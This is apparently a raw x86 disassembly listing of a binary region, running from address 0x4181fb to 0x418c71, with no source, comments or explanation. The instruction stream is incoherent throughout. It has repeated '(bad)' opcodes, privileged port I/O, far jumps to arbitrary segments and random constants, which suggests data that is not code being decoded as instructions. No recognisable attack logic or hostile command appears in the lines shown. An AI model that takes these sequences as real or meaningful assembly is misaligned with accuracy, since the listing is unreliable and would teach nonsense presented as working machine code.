  4181fb:	jg     0x4181fb
  4181fd:	inc    edi
  4181fe:	fisub  DWORD PTR ds:0x22fdc7b5
  418204:	mov    ds:0xa7fe6c47,al
  418209:	call   DWORD PTR [ecx-0x5020f5c5]
  41820f:	add    DWORD PTR [eax],eax
	...
  418271:	add    BYTE PTR [eax],al
  418273:	add    BYTE PTR [edi],dh
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0xe5e6b8d6
  418282:	push   ecx
  418283:	scas   eax,DWORD PTR es:[edi]
  418284:	nop
  418285:	inc    DWORD PTR [eax]
  418287:	add    BYTE PTR [ecx+eax*1],al
  41828a:	add    BYTE PTR [eax],al
  41828c:	ds dec ebp
  41828e:	loopne 0x4182d9
  418290:	mov    DWORD PTR [eax],ebp
  418292:	jbe    0x41821b
  418294:	ror    dh,1
  418296:	retf   0x7c48
  418299:	sub    ebp,DWORD PTR [eax+esi*8-0x36]
  41829d:	shl    DWORD PTR [edx],1
  41829f:	xchg   edx,eax
  4182a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182a1:	into   
  4182a2:	or     BYTE PTR [ebp-0x72847152],dl
  4182a8:	push   ds
  4182a9:	fcom   DWORD PTR [edi+0xb75a4e0]
  4182af:	aaa    
  4182b0:	test   DWORD PTR [edx],esp
  4182b2:	or     eax,0xec83dd
  4182b7:	pop    ebp
  4182b8:	outs   dx,DWORD PTR ds:[esi]
  4182b9:	fimul  DWORD PTR [ebx]
  4182bb:	inc    edx
  4182bc:	aaa    
  4182bd:	jnp    0x41830a
  4182bf:	iret   
  4182c0:	pop    ebx
  4182c1:	in     eax,dx
  4182c2:	sub    ecx,edi
  4182c4:	mov    DWORD PTR [edi+0xe36e063],esi
  4182ca:	stos   DWORD PTR es:[edi],eax
  4182cb:	pushf  
  4182cc:	mov    al,0xcd
  4182ce:	mov    ch,0x92
  4182d0:	pusha  
  4182d1:	in     al,dx
  4182d2:	pop    edi
  4182d3:	push   edi
  4182d4:	out    dx,eax
  4182d5:	push   ss
  4182d6:	pop    ebp
  4182d7:	mov    ecx,ecx
  4182d9:	sbb    BYTE PTR [eax+0x1c],cl
  4182dc:	mov    edx,0xee3bde13
  4182e1:	popa   
  4182e2:	mov    dh,0xc
  4182e4:	nop
  4182e5:	lahf   
  4182e6:	mov    edx,0x67e3c12a
  4182eb:	xor    al,0x50
  4182ed:	jo     0x41834a
  4182ef:	das    
  4182f0:	in     al,0x25
  4182f2:	xchg   DWORD PTR [ecx],ebx
  4182f4:	pusha  
  4182f5:	pop    ebx
  4182f6:	push   esp
  4182f7:	call   0x9905:0x23733553
  4182fe:	imul   edx,DWORD PTR ds:0x883fc976,0xffffffd2
  418305:	add    eax,0x81274750
  41830a:	les    edx,FWORD PTR [ebx-0x4fe0c901]
  418310:	or     BYTE PTR [edi+0x106a5167],ch
  418316:	and    eax,0x506f40af
  41831b:	pop    ss
  41831c:	inc    ecx
  41831d:	sub    edx,DWORD PTR [edx-0x42]
  418320:	push   cs
  418321:	push   ebx
  418322:	xchg   ebx,eax
  418323:	ror    BYTE PTR [edx+eax*8],1
  418326:	test   al,0xd0
  418328:	aaa    
  418329:	test   al,0x3f
  41832b:	lds    edx,FWORD PTR [esi-0x38652df0]
  418331:	mov    ch,0x6f
  418333:	(bad)  
  418334:	mov    ah,0x41
  418336:	imul   edx,DWORD PTR [edx+edi*8+0x6fd7c298],0x2b
  41833e:	mov    ebp,0x9a6c3849
  418343:	pop    ss
  418344:	xchg   BYTE PTR [edi-0x35],ah
  418347:	xor    BYTE PTR [edi+0x52bd25d1],dh
  41834d:	mov    edi,0xa4e7ef45
  418352:	sub    BYTE PTR [edx+0x28552c52],0x1d
  418359:	jo     0x41833e
  41835b:	and    BYTE PTR [ecx+esi*2+0x7b],bl
  41835f:	jmp    0x442c:0x13d94ee3
  418366:	mov    al,ds:0xf2565966
  41836b:	(bad)  
  41836c:	cld    
  41836d:	sub    al,0x78
  41836f:	pop    eax
  418370:	sub    ch,ch
  418372:	adc    DWORD PTR [ebx+0x27885b51],edx
  418378:	test   ecx,edi
  41837a:	mov    ax,cx
  41837d:	dec    ebx
  41837e:	scas   al,BYTE PTR es:[edi]
  41837f:	adc    DWORD PTR [edi+0x2f74e129],esi
  418385:	(bad)  
  418386:	ret    
  418387:	mov    dl,0x30
  418389:	xchg   edi,eax
  41838a:	cdq    
  41838b:	scas   al,BYTE PTR es:[edi]
  41838c:	out    dx,eax
  41838d:	and    edi,0x15
	...
  4183f4:	fdiv   QWORD PTR [ebx-0x2380afc1]
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	(bad)  
  418401:	cld    
  418402:	fld    DWORD PTR [ebx-0x6c]
  418405:	add    BYTE PTR [ecx],al
  418407:	add    BYTE PTR [ecx+eax*1],al
  41840a:	add    BYTE PTR [eax],al
  41840c:	sahf   
  41840d:	xchg   esi,eax
  41840e:	mov    al,ds:0xf9e8247
  418413:	test   al,0x2f
  418415:	les    ecx,FWORD PTR [esi-0x54c15d47]
  41841b:	or     al,0x4d
  41841d:	icebp  
  41841e:	jl     0x4183e7
  418420:	into   
  418421:	and    ax,0xad2a
  418425:	sub    eax,0x65634c1
  41842a:	adc    esp,DWORD PTR fs:[ebx]
  41842d:	outs   dx,BYTE PTR ds:[esi]
  41842e:	retf   
  41842f:	push   ebx
  418430:	not    BYTE PTR ds:0x555795fd
  418436:	dec    esi
  418437:	call   0x9fb:0xc46f2dc8
  41843e:	jno    0x4184a2
  418440:	ror    DWORD PTR [ecx+ecx*8-0x7a98a1c0],cl
  418447:	or     al,ch
  418449:	push   ecx
  41844a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41844b:	push   esp
  41844c:	jno    0x418432
  41844e:	adc    dh,al
  418450:	mov    cl,0x98
  418452:	jg     0x4183f7
  418454:	sti    
  418455:	add    esi,DWORD PTR ds:0x82b594bd
  41845b:	loopne 0x4183e2
  41845d:	mov    cl,0xe1
  41845f:	in     eax,0xe6
  418461:	sub    al,0xdc
  418463:	aam    0x51
  418465:	loope  0x41842d
  418467:	and    DWORD PTR [ebp+0x55],0x730cef25
  41846e:	fwait
  41846f:	sbb    ch,bh
  418471:	cld    
  418472:	xchg   ebp,eax
  418473:	mov    ebx,0x1e51232d
  418478:	sti    
  418479:	enter  0x1ca1,0xae
  41847d:	sbb    DWORD PTR [ecx],eax
  41847f:	pop    ebx
  418480:	popa   
  418481:	pop    eax
  418482:	or     eax,0x35b97aa2
  418487:	stc    
  418488:	inc    ebx
  418489:	repz or eax,0x194e3089
  41848f:	ja     0x4184a5
  418491:	test   BYTE PTR [ecx],bl
  418493:	push   es
  418494:	(bad)  
  418495:	popa   
  418496:	pop    ecx
  418497:	(bad)  
  418499:	or     esi,DWORD PTR [ebx]
  41849b:	and    edi,DWORD PTR [ebx-0xdc0b65f]
  4184a1:	sub    BYTE PTR ds:0x521203f4,dl
  4184a7:	bound  edi,QWORD PTR ds:0x3f67ac53
  4184ad:	xchg   esp,eax
  4184ae:	xor    ebx,ebx
  4184b0:	inc    edi
  4184b1:	sti    
  4184b2:	test   al,0xa3
  4184b4:	out    dx,al
  4184b5:	jmp    0x3d54:0x7195e6c7
  4184bc:	jae    0x418508
  4184be:	add    al,0xa7
  4184c0:	es dec esi
  4184c2:	rcr    BYTE PTR [ecx+0x5a],0x57
  4184c6:	cmc    
  4184c7:	scas   eax,DWORD PTR es:[edi]
  4184c8:	out    0xca,al
  4184ca:	cmp    BYTE PTR [edi],ch
  4184cc:	loopne 0x4184ae
  4184ce:	and    ah,BYTE PTR [edx-0x6d9f7c07]
  4184d4:	and    DWORD PTR [edi],esi
  4184d6:	test   al,0x7b
  4184d8:	mov    DWORD PTR [ebp-0x19],ecx
  4184db:	xchg   ebx,eax
  4184dc:	int3   
  4184dd:	mov    WORD PTR [esi-0x4a],ds
  4184e0:	adc    BYTE PTR [ebp+0x1c209b52],dh
  4184e6:	pop    esi
  4184e7:	ss mov dh,0x4b
  4184ea:	retf   
  4184eb:	dec    edi
  4184ec:	das    
  4184ed:	ror    BYTE PTR ds:0x60d9b7d1,cl
  4184f3:	xchg   eax,edx
  4184f5:	xor    al,0x83
  4184f7:	xor    ch,BYTE PTR [edx]
  4184f9:	jmp    0xe4562d53
  4184fe:	popf   
  4184ff:	addr16 push ebx
  418501:	dec    BYTE PTR [ebx+0x59e5d22d]
  418507:	adc    eax,0x4b8b6738
  41850c:	add    dl,bl
  41850e:	not    BYTE PTR [edx+0x0]
	...
  418574:	inc    ecx
  418575:	stc    
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	in     eax,0x6b
  418582:	inc    ebp
  418583:	xchg   esp,eax
  418584:	cwde   
  418585:	add    DWORD PTR [ecx],eax
  418587:	add    BYTE PTR [ecx+eax*1],al
  41858a:	add    BYTE PTR [eax],al
  41858c:	mov    ecx,0x167ed494
  418591:	addr16 pop esi
  418593:	push   esi
  418594:	retf   
  418595:	ins    BYTE PTR es:[edi],dx
  418596:	fldenv [esi+eiz*2-0x6c]
  41859a:	mov    ds:0x74e280ff,eax
  41859f:	call   0xd9250013
  4185a4:	gs addr16 repz mov ah,0x71
  4185a9:	xor    al,0x16
  4185ab:	xor    BYTE PTR [edi],0x5b
  4185ae:	inc    edx
  4185af:	push   0xfffffffb
  4185b1:	(bad)  
  4185b3:	test   BYTE PTR [edi+0x48],0xd1
  4185b7:	(bad)  
  4185b8:	xor    eax,0x4035b278
  4185bd:	mov    cl,0x12
  4185bf:	mov    BYTE PTR [ebx+0x201f1b05],cl
  4185c5:	ins    BYTE PTR es:[edi],dx
  4185c6:	aad    0xbf
  4185c8:	push   esi
  4185c9:	jmp    0x9540:0xc7b100ea
  4185d0:	rol    cl,0x7f
  4185d3:	popa   
  4185d4:	outs   dx,DWORD PTR ds:[esi]
  4185d5:	pop    ss
  4185d6:	inc    esi
  4185d7:	add    BYTE PTR [eax-0x60fb686d],dl
  4185dd:	mov    edx,0xbfdac772
  4185e2:	(bad)  
  4185e4:	adc    eax,0xc142dcc3
  4185e9:	stos   BYTE PTR es:[edi],al
  4185ea:	sub    eax,0x2ee0b708
  4185ef:	aad    0x15
  4185f1:	out    0x4,al
  4185f3:	push   ss
  4185f4:	fnstenv [edx+0x4]
  4185f7:	sub    al,BYTE PTR [ebx-0x5d]
  4185fa:	pop    esp
  4185fb:	fld    TBYTE PTR [edi+0x3b]
  4185fe:	js     0x418591
  418600:	nop
  418601:	sub    DWORD PTR [esi+esi*8+0x4a825fc9],0xfffffff1
  418609:	je     0x4185bb
  41860b:	(bad)  
  41860c:	or     bl,BYTE PTR [edx-0x3f9d8d98]
  418612:	je     0x4185ff
  418614:	lea    ebp,[ebx]
  418616:	pop    ss
  418617:	push   eax
  418618:	add    dh,BYTE PTR [ecx-0x1e89c1d5]
  41861e:	daa    
  41861f:	ficom  DWORD PTR [edx+0x30d74076]
  418625:	xchg   esi,eax
  418626:	xor    al,0x9
  418628:	xor    DWORD PTR [edi+0x6a],edx
  41862b:	(bad)  
  41862c:	loope  0x41868e
  41862e:	and    BYTE PTR [edi-0x5b],dh
  418631:	jne    0x418650
  418633:	mov    esp,0x630d3f8c
  418638:	outs   dx,BYTE PTR ds:[esi]
  418639:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41863a:	cli    
  41863b:	in     eax,dx
  41863c:	sbb    eax,0x7f62794e
  418641:	fcom   DWORD PTR [ebx]
  418643:	adc    esp,DWORD PTR [ebx]
  418645:	jne    0x418682
  418647:	dec    edi
  418648:	sbb    dl,BYTE PTR [esi]
  41864a:	ret    
  41864b:	pop    ebp
  41864c:	add    ebx,eax
  41864e:	sti    
  41864f:	xlat   BYTE PTR ds:[ebx]
  418650:	push   0x2505039c
  418655:	jl     0x4186b9
  418657:	push   ebp
  418658:	push   eax
  418659:	mov    al,cl
  41865b:	out    0x3c,eax
  41865d:	imul   esi,DWORD PTR [edx+0x18975bb7],0x53ac6252
  418667:	stc    
  418668:	std    
  418669:	mov    eax,ds:0x628b56aa
  41866e:	fisttp WORD PTR [eax-0x2626a807]
  418674:	aam    0x4a
  418676:	pop    esi
  418677:	mov    dl,0xe2
  418679:	dec    edx
  41867a:	push   esi
  41867b:	xchg   ebx,eax
  41867c:	mov    edi,0x27dee34a
  418681:	cmp    al,0x44
  418683:	repnz mov ebp,edx
  418686:	pop    ss
  418687:	push   esp
  418688:	jmp    0xe3f92324
  41868d:	mov    ecx,0x35ca
	...
  4186f2:	add    BYTE PTR [eax],al
  4186f4:	xchg   ebx,eax
  4186f5:	sub    BYTE PTR [eax-0x604344c4],ah
  4186fb:	scas   eax,DWORD PTR es:[edi]
  4186fc:	or     al,0x8d
  4186fe:	cmp    edx,edx
  418700:	(bad)  
  418701:	inc    ecx
  418702:	push   eax
  418703:	xchg   ecx,eax
  418704:	pushf  
  418705:	add    al,BYTE PTR [ecx]
  418707:	add    BYTE PTR [ecx+eax*1],al
  41870a:	add    BYTE PTR [eax],al
  41870c:	pop    ecx
  41870d:	lock cwde 
  41870f:	jno    0x418725
  418711:	push   ebp
  418712:	mov    esp,0x218f2262
  418717:	data16 sub al,0x9f
  41871a:	push   edx
  41871b:	mov    al,ds:0x201873aa
  418720:	inc    esp
  418722:	sub    ah,BYTE PTR [esp+edx*1]
  418725:	inc    ebp
  418726:	xchg   esp,eax
  418727:	xchg   ebx,eax
  418728:	ds jno 0x418739
  41872b:	mov    al,0xc0
  41872d:	bound  eax,QWORD PTR [ebx]
  41872f:	pcmpgtw mm7,QWORD PTR [ecx*1+0x75c13dd9]
  418737:	(bad)  
  418738:	cmovns eax,edx
  41873b:	adc    BYTE PTR [edx+edi*8-0x78],bl
  41873f:	inc    esi
  418740:	cmp    eax,0x9d13c99f
  418745:	in     al,0x52
  418747:	and    dl,BYTE PTR [ecx+0x4b2b770f]
  41874d:	retf   
  41874e:	pushf  
  41874f:	popf   
  418750:	rdtsc  
  418752:	mov    ebx,0xf3237bd7
  418757:	cwde   
  418758:	and    cl,BYTE PTR [edi+ecx*4+0x52bcbd06]
  41875f:	dec    ebx
  418760:	lahf   
  418761:	mov    ecx,0x5573bbbf
  418766:	push   0xffffffd3
  418768:	hlt    
  418769:	imul   ebx,esi,0xd4a6c8e6
  41876f:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418771:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418772:	sahf   
  418773:	imul   ecx,ebp,0xfffffff6
  418776:	jg     0x4187b3
  418778:	mov    eax,0xc326d411
  41877d:	xchg   ebx,eax
  41877e:	popf   
  41877f:	rol    DWORD PTR [eax+0x57],0x95
  418783:	stos   DWORD PTR es:[edi],eax
  418784:	retf   
  418785:	es push eax
  418787:	xor    bh,ah
  418789:	cmc    
  41878a:	adc    al,BYTE PTR [ebx]
  41878c:	sbb    eax,0x12e65bfe
  418791:	mov    ecx,0x224ee66b
  418796:	jg     0x4187fc
  418798:	adc    ah,BYTE PTR [ebp+0x57]
  41879b:	jp     0x41880f
  41879d:	nop
  41879e:	jns    0x418720
  4187a0:	or     al,0x5a
  4187a2:	mov    BYTE PTR [esi],0xe8
  4187a5:	repnz dec ebx
  4187a7:	mov    cl,0x84
  4187a9:	lock xchg ecx,eax
  4187ab:	jmp    DWORD PTR [edi]
  4187ad:	fnsave ds:0xb538cf6
  4187b3:	sbb    esp,ebp
  4187b5:	xor    DWORD PTR [ebx+0x212ee451],edx
  4187bb:	xchg   ebp,eax
  4187bc:	add    eax,0x86deaf38
  4187c1:	leave  
  4187c2:	outs   dx,BYTE PTR ds:[esi]
  4187c3:	addr16 aaa 
  4187c5:	shr    DWORD PTR [ebp+0x12],cl
  4187c8:	jp     0x4187ae
  4187ca:	push   ds
  4187cb:	pop    ecx
  4187cc:	test   al,0x18
  4187ce:	das    
  4187cf:	xchg   ebp,eax
  4187d0:	xor    BYTE PTR [eax+0x16ded6f5],bh
  4187d6:	(bad)  
  4187d7:	in     eax,dx
  4187d8:	nop
  4187d9:	int3   
  4187da:	pop    es
  4187db:	psubw  mm6,QWORD PTR gs:[edi+0x7e]
  4187e0:	(bad)  
  4187e1:	fdivr  DWORD PTR [edi-0x2]
  4187e4:	add    al,0x5
  4187e6:	adc    edi,eax
  4187e8:	pop    ebx
  4187e9:	push   edi
  4187ea:	xchg   ebx,eax
  4187eb:	ja     0x418791
  4187ed:	push   cs
  4187ee:	or     ah,BYTE PTR [edx]
  4187f0:	cmp    DWORD PTR [eax+0x2],eax
  4187f3:	fisttp DWORD PTR [edi+0x15]
  4187f6:	addr16 jl 0x418855
  4187f9:	and    esi,esp
  4187fb:	mov    ecx,0x2782e888
  418800:	aaa    
  418801:	sub    al,cl
  418803:	jo     0x4187c5
  418805:	jge    0x4187bc
  418807:	push   ecx
  418808:	add    ah,ch
  41880a:	adc    DWORD PTR [eax+0x2f],0xffffffa3
  41880e:	jl     0x4187ab
	...
  418874:	xchg   esp,eax
  418875:	enter  0x4337,0x7f
  418879:	push   esp
  41887b:	fbld   TBYTE PTR [esi+0x7b9c3acd]
  418881:	gs push ecx
  418884:	mov    al,ds:0x4000103
  418889:	add    DWORD PTR [eax],eax
  41888b:	add    BYTE PTR [esi+esi*2-0x6c55bf84],cl
  418892:	or     BYTE PTR [esi],al
  418894:	or     al,0x8e
  418896:	mov    al,ds:0x3404a306
  41889b:	loope  0x4188b8
  41889d:	iret   
  41889e:	adc    eax,edi
  4188a0:	stc    
  4188a1:	push   ss
  4188a2:	pop    ebp
  4188a3:	mov    dl,0x13
  4188a5:	xchg   BYTE PTR [eax],ch
  4188a7:	dec    ebx
  4188a8:	add    ebp,esi
  4188aa:	test   al,0x95
  4188ac:	mov    bh,0xef
  4188ae:	clc    
  4188af:	popa   
  4188b0:	(bad)  
  4188b2:	jge    0x41883c
  4188b4:	sbb    DWORD PTR [eax],0xffffffc4
  4188b7:	push   cs
  4188b8:	add    eax,0x5ba3924e
  4188bd:	(bad)  
  4188be:	sbb    bl,BYTE PTR [ebx+0x2c3bef47]
  4188c4:	les    ebx,FWORD PTR [edx+0x6]
  4188c7:	jae    0x4188ea
  4188c9:	xchg   esi,eax
  4188ca:	pop    es
  4188cb:	mov    ah,0xfd
  4188cd:	mov    al,0x6e
  4188cf:	push   0x9d811a9b
  4188d4:	xchg   ecx,eax
  4188d5:	cmp    eax,0x239d476e
  4188da:	xor    ebp,DWORD PTR [ecx-0x50]
  4188dd:	adc    BYTE PTR [esi+edx*4-0x31],0x4a
  4188e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188e3:	push   ecx
  4188e4:	(bad)  
  4188e5:	ds loop 0x41892f
  4188e8:	scas   eax,DWORD PTR es:[edi]
  4188e9:	add    DWORD PTR [ecx],0xffffffc3
  4188ec:	imul   esp,DWORD PTR [edx+edx*8-0x3aec3e48],0x7e
  4188f4:	adc    eax,0xf2a7c90f
  4188f9:	inc    ebp
  4188fa:	jno    0x4188e6
  4188fc:	push   ebp
  4188fd:	mov    edi,0xed4890f8
  418902:	mov    dh,BYTE PTR [ecx]
  418904:	mov    edi,0x98044bdb
  418909:	out    dx,al
  41890a:	js     0x418891
  41890c:	retf   
  41890d:	and    bl,0x3e
  418910:	dec    ecx
  418911:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418912:	lahf   
  418913:	pop    ebp
  418914:	sbb    bl,BYTE PTR [edx]
  418916:	mov    esi,esp
  418918:	xchg   DWORD PTR [edi-0x7d5c7987],eax
  41891e:	jmp    0x4188b4
  418920:	test   BYTE PTR [ecx+eax*4],0x55
  418924:	mov    bh,0x6
  418926:	mov    BYTE PTR [edx],dl
  418928:	xor    ecx,esp
  41892a:	rol    cl,0xa1
  41892d:	dec    ebp
  41892e:	loopne 0x418922
  418930:	in     eax,0x3
  418932:	pop    edx
  418933:	mov    edi,DWORD PTR [esp+ebp*1+0x5f3c2b20]
  41893a:	jmp    0x1d77:0x4cd5c11f
  418941:	pop    ebp
  418942:	scas   al,BYTE PTR es:[edi]
  418943:	(bad)  
  418945:	aad    0xa1
  418947:	cmc    
  418948:	(bad)  
  418949:	dec    eax
  41894a:	dec    edi
  41894b:	dec    ebp
  41894c:	jmp    0x4189bf
  41894e:	xchg   ebp,eax
  41894f:	cs imul ecx,DWORD PTR cs:[edi+0x30635231],0x3c386172
  41895b:	fadd   st(0),st
  41895d:	xchg   edi,eax
  41895e:	cwde   
  41895f:	push   ecx
  418960:	fmul   st(2),st
  418962:	pop    edx
  418963:	ds cmp esi,esi
  418966:	mov    eax,ds:0x68197f11
  41896b:	arpl   WORD PTR [edx-0x7f],cx
  41896e:	repz scas eax,DWORD PTR es:[edi]
  418970:	push   cs
  418971:	hlt    
  418972:	adc    eax,0x596bdd12
  418977:	shl    cl,cl
  418979:	fadd   DWORD PTR [esi]
  41897b:	adc    BYTE PTR ds:0xdb075b21,0xe7
  418982:	loop   0x418925
  418984:	out    dx,al
  418985:	retf   
  418986:	jg     0x4189cf
  418988:	daa    
  418989:	lock ins DWORD PTR es:[edi],dx
  41898b:	mov    eax,0xd2c66f3c
	...
  4189f4:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0xa6e71e69
  418a03:	jge    0x4189a9
  418a05:	add    al,0x1
  418a07:	add    BYTE PTR [ecx+eax*1],al
  418a0a:	add    BYTE PTR [eax],al
  418a0c:	jle    0x418a0d
  418a0e:	mov    ecx,0x185c29f2
  418a13:	(bad)  
  418a14:	fisttp WORD PTR [eax-0x3c]
  418a17:	xor    DWORD PTR gs:[eax+0x34aeb7ec],ebx
  418a1e:	outs   dx,DWORD PTR ds:[esi]
  418a1f:	xor    al,0x8f
  418a21:	shl    DWORD PTR [ecx-0x74905826],1
  418a27:	sbb    ecx,DWORD PTR [eax+0x38a65cd1]
  418a2d:	jg     0x418a09
  418a2f:	fldcw  WORD PTR [esi+eiz*2-0x79]
  418a33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a34:	mov    eax,0xb11cb326
  418a39:	push   esp
  418a3a:	jmp    0x418a2c
  418a3c:	adc    BYTE PTR ds:0x30578674,al
  418a42:	out    dx,al
  418a43:	dec    ebx
  418a44:	retf   
  418a45:	jb     0x4189f8
  418a47:	mov    cs,WORD PTR [edx+0x1f]
  418a4a:	or     eax,0x75ca3ab2
  418a4f:	lods   eax,DWORD PTR ds:[esi]
  418a50:	out    0x7d,al
  418a52:	push   es
  418a53:	enter  0x589d,0x65
  418a57:	cli    
  418a58:	retf   0xf23f
  418a5b:	xor    al,0xe7
  418a5d:	push   ds
  418a5e:	push   ds
  418a5f:	aaa    
  418a60:	sbb    al,0xe2
  418a62:	dec    ebp
  418a63:	popa   
  418a64:	enter  0xf4fd,0x8a
  418a68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a69:	leave  
  418a6a:	je     0x418ac5
  418a6c:	push   eax
  418a6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a6e:	push   ebp
  418a6f:	push   edi
  418a70:	push   DWORD PTR ds:0x8b0faf63
  418a76:	push   edx
  418a77:	xchg   BYTE PTR [edx+0x54],bh
  418a7a:	pushf  
  418a7b:	pushf  
  418a7c:	jmp    0x418a1a
  418a7e:	sub    edx,DWORD PTR [eax]
  418a80:	mov    ecx,DWORD PTR [edx+0x3eea6b15]
  418a86:	nop
  418a87:	sub    ecx,DWORD PTR [ecx-0x4018c39a]
  418a8d:	repz sub eax,0xa884683b
  418a93:	pop    esp
  418a94:	out    0xf2,eax
  418a96:	push   edi
  418a97:	mov    ch,0x4e
  418a99:	cs fsubp st(3),st
  418a9c:	test   eax,0x2ce4f464
  418aa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418aa2:	pop    ecx
  418aa3:	out    0xd0,eax
  418aa5:	jns    0x418a65
  418aa7:	fsub   DWORD PTR [ecx]
  418aa9:	(bad)  
  418aaa:	(bad)  
  418aab:	cwde   
  418aac:	inc    ecx
  418aad:	je     0x418af2
  418aaf:	sbb    ebp,DWORD PTR [esi]
  418ab1:	add    dh,BYTE PTR [ebp+0x6f89ea3]
  418ab7:	adc    DWORD PTR [eax],eax
  418ab9:	fcmove st,st(7)
  418abb:	shl    edx,1
  418abd:	shl    edi,0xa5
  418ac0:	les    edx,FWORD PTR [edi-0x28]
  418ac3:	and    eax,0x174ebcf6
  418ac8:	mov    ds:0x90bdff1f,eax
  418acd:	in     al,0x86
  418acf:	or     al,0x2a
  418ad1:	test   eax,0x22b2864a
  418ad6:	pop    edi
  418ad7:	sti    
  418ad8:	xor    BYTE PTR [eax-0x20182829],bh
  418ade:	sar    DWORD PTR [ebx-0x3af3fca4],1
  418ae4:	in     al,0xcf
  418ae6:	imul   BYTE PTR [edx-0x1e]
  418ae9:	dec    ebp
  418aea:	xchg   esp,eax
  418aeb:	(bad)  
  418aec:	mov    dh,0x47
  418aee:	sbb    bh,bl
  418af0:	outs   dx,BYTE PTR ds:[esi]
  418af1:	mov    ah,0x31
  418af3:	retf   0x2574
  418af6:	or     DWORD PTR [bp+di+0x5fcc],esp
  418afb:	out    0x66,al
  418afd:	repz mov ebp,0xfabc5c51
  418b03:	test   BYTE PTR [edx+0x49bc37c0],0xa5
  418b0a:	inc    edx
  418b0b:	ret    
  418b0c:	and    eax,0xcc06c8
	...
  418b71:	add    BYTE PTR [eax],al
  418b73:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  418b77:	xor    ch,bh
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0x4
  418b81:	inc    esi
  418b82:	jnp    0x418b41
  418b84:	test   al,0x5
  418b86:	add    DWORD PTR [eax],eax
  418b88:	add    al,0x1
  418b8a:	add    BYTE PTR [eax],al
  418b8c:	je     0x418b38
  418b8e:	and    BYTE PTR [ecx-0x7f],0x3f
  418b92:	loope  0x418b49
  418b94:	or     dh,bl
  418b96:	outs   dx,DWORD PTR ds:[esi]
  418b97:	aaa    
  418b98:	sbb    BYTE PTR [ecx-0x6b],bh
  418b9b:	cli    
  418b9c:	fstp   QWORD PTR [eax+0xa6b19fa]
  418ba2:	xchg   dl,bl
  418ba4:	mov    ds:0x1badc1f6,eax
  418ba9:	xor    al,0x9b
  418bab:	retf   
  418bac:	dec    eax
  418bad:	jmp    0xf3f4:0xfa5b63c1
  418bb4:	fwait
  418bb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bb6:	or     ch,BYTE PTR [edi-0x766d5a94]
  418bbc:	ror    BYTE PTR [edx+0x17],1
  418bbf:	push   esp
  418bc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bc1:	in     al,dx
  418bc2:	mov    edi,0x5a0850b5
  418bc7:	retf   
  418bc8:	mov    ebx,0xd5d6e043
  418bcd:	push   edx
  418bce:	div    DWORD PTR [ecx]
  418bd0:	and    edi,DWORD PTR [esp+eax*8+0x26]
  418bd4:	inc    esi
  418bd5:	mov    cl,0x90
  418bd7:	pop    es
  418bd8:	cld    
  418bd9:	out    0x47,al
  418bdb:	test   BYTE PTR [esi+eiz*2],0x85
  418bdf:	cmp    ecx,edi
  418be1:	sbb    eax,0xe24ff380
  418be6:	mov    ecx,ecx
  418be8:	ins    DWORD PTR es:[edi],dx
  418be9:	mov    dh,0x1c
  418beb:	shufps xmm1,XMMWORD PTR [edx+0x59feafe8],0xe4
  418bf3:	jae    0x418bd7
  418bf5:	add    DWORD PTR [ebx+0x1e],ebp
  418bf8:	mov    ah,0xf2
  418bfa:	add    al,0x93
  418bfc:	cwde   
  418bfd:	cmc    
  418bfe:	cld    
  418bff:	fcomp  st(7)
  418c01:	aaa    
  418c02:	xor    al,0x2b
  418c04:	jge    0x418c54
  418c06:	inc    ecx
  418c07:	mov    DWORD PTR [ecx],ecx
  418c09:	dec    eax
  418c0a:	test   al,0x68
  418c0c:	mov    dh,0xf9
  418c0e:	aam    0x21
  418c10:	ss bnd jge 0x2249cbb5
  418c18:	add    eax,0x21ca082
  418c1d:	mov    esp,DWORD PTR [esi+0x1b]
  418c20:	adc    DWORD PTR [eax],edi
  418c22:	int    0x42
  418c24:	div    edx
  418c26:	ror    DWORD PTR [esi-0x55],1
  418c29:	add    al,0x61
  418c2b:	shl    eax,cl
  418c2d:	push   0x58
  418c2f:	out    dx,al
  418c30:	lahf   
  418c31:	mov    edi,DWORD PTR [edx+0x869d6ef]
  418c37:	sub    dl,BYTE PTR ds:0x5aad6656
  418c3d:	mov    WORD PTR [ebx+edx*4-0x5678f6b5],ss
  418c44:	fsub   st(0),st
  418c46:	sti    
  418c47:	xor    bh,cl
  418c49:	push   cs
  418c4a:	idiv   DWORD PTR [edx]
  418c4c:	je     0x418c64
  418c4e:	sub    eax,0x4b735038
  418c53:	aad    0x42
  418c55:	mov    al,0x66
  418c57:	stc    
  418c58:	xchg   esi,eax
  418c59:	jle    0x418c90
  418c5b:	outs   dx,BYTE PTR ds:[esi]
  418c5c:	lods   eax,DWORD PTR ds:[esi]
  418c5d:	iret   
  418c5e:	pop    es
  418c5f:	or     ch,BYTE PTR [ebx-0x2f24cf8a]
  418c65:	mov    dl,0xe9
  418c67:	push   edx
  418c68:	mov    ds:0x8fd2b160,al
  418c6d:	stc    
  418c6e:	pop    ebp
  418c6f:	js     0x418c5c
  418c71:	jecxz  0x418ce8
